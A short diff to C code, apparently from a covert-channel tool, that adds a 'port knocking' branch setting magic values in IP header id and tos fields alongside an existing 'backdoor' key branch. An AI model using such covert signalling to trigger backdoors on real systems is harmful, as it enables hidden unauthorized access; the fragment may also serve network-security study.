@@ -42,7 +42,11 @@ void covert_send(char *sip, char *dip, unsigned short sport, unsigned short dpor
         packet.ip.id = data[0];
         printf("sending: %c\n", data[0]);
         packet.ip.tos = 0;
-    } else {
+    }else if(covert_channel == 2){
+        //key for port knocking
+        packet.ip.id = 'l';  //enter a single ASCII character into the field
+        packet.ip.tos = 'b';
+    }else {
         //key for backdoor
         packet.ip.id = 'b';  //enter a single ASCII character into the field
         packet.ip.tos = 'l';
